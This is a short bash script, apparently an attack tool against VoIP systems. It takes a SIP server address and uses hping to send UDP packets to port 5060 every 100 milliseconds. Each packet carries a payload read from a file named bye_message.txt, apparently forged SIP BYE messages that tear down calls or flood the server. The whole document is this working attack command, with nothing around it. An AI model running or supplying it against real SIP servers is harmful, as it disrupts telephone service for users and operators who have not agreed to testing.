#!/bin/bash

if [ $# -ne 1 ] ; then
	echo "Syntax: $0 [SIP-Server]"
	exit 1
fi

hping $1 --udp -p 5060 --file bye_message.txt -d 467 -i u100000
